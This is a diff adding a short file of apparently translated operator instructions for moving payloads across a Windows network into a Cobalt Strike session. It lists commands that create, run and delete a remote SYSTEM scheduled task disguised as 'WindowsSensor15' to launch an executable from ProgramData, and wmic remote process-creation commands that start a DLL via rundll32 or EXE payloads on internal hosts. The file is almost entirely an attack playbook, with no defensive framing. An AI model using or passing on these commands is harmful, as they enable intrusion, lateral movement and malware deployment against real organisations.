@@ -1,0 +1,18 @@
+HOW TO JUMP THROUGH PAYLOAD SESSIONS
+Commands to start payload to pull the session into cobalt
+
+1) shell SCHTASKS / s MS040926754153 / RU "SYSTEM" / create / tn "WindowsSensor15" / tr "cmd.exe / c C: \ ProgramData \ P32.exe" / sc ONCE / sd 01/01/1970 / st 00: 00
+2) shell SCHTASKS / s MS040926754153 / run / TN "WindowsSensor15"
+3) shell schtasks / S MS040926754153 / TN "WindowsSensor15" / DELETE / F instead of MS040926754153
+
+you transfer, then pack and then you type the commands to :
+
+1) create a task with a payload
+2) Get in
+3) launch
+
+We start wmic launches more times :
+
+1) if it is a DLL, then shell wmic /node:192.168.104.13 process call create "rundll32.exe C: \ ProgramData \ x64.dll StartW" dll, I think syntax is clear If you are on RDP> we open CMD from the administrator and rundll32.exe C: \ ProgramData \ x64.dll, StartW accordingly you can specify any way, according to where your dll
+
+For EXE format or format .bat zapus lies. immediately shell wmic /node:10.28.0.3 process call create "C: \ ProgramData \ j1.exe"
